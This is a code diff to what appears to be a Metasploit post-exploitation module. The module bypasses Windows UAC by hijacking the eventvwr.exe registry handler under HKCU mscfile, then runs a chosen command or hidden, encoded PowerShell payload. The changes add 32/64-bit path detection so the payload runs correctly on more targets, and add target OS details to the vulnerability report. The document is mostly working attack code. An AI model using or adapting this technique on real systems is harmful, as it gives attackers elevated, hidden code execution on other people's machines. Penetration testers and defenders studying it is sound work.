@@ -163,20 +163,27 @@ class MetasploitModule < Msf::Post
 
 
 
-
 # -------------------------------------------------------
 # GAIN REMOTE CODE EXCUTION BY HIJACKING EVENTVWR PROCESS
 # -------------------------------------------------------
 def ls_stage1
 
+session = client
+# check target arch (to inject into powershell string)
+arch_check = client.fs.file.expand_path("%Windir%\\SysWOW64")
+if arch_check == "C:\\Windows\\SysWOW64"
+  arch = "SysWOW64"
+else
+  arch = "System32"
+end
+
   r=''
-  session = client
   vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
   exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
-  comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
+  comm_path = "%SystemRoot%\\#{arch}\\cmd.exe /c" # cmd.exe %comspec% path
   regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
-  psh_lpath = "%SystemRoot%\\System32\\WindowsPowershell\\v1.0\\powershell.exe" # powershell.exe %comspec% path
+  psh_lpath = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe" # powershell.exe %comspec% path
   psh_comma = "#{psh_lpath} -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
   # check for proper config settings enter
@@ -342,6 +349,7 @@ def ls_stage3
 
   r=''
   session = client
+  oscheck = client.fs.file.expand_path("%OS%")
   vuln_soft = "eventvwr.exe" # vulnerable software name
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   vuln_hive = "HKCR\\mscfile\\shell\\open\\command" # vulnerable hive key call (mmc.exe)
@@ -389,11 +397,18 @@ def ls_stage3
       report_level = "#{check_uac} (EXPLOITABLE)"
     end
 
+      # obsolect 'def run' allready checks for OS compatiblity.
+      if oscheck.nil?
+        oscheck = "NOT COMPATIBLE SYSTEM"
+      end
+
   print_line("")
   # display target registry settings to user...
   # i hope you are smart enouth to recognise a vulnerable output :D
   print_line("VULNERABLE_SOFT : #{vuln_soft}")
+  print_line("    TARGET_OS   : #{oscheck}")
   print_line("    UAC_LEVEL   : #{report_level}")
+  print_line("")
   print_line("    VULN_HIVE   : #{vuln_hive}")
   print_line("    KEY_INFO    : #{report_on}")
   print_line("")
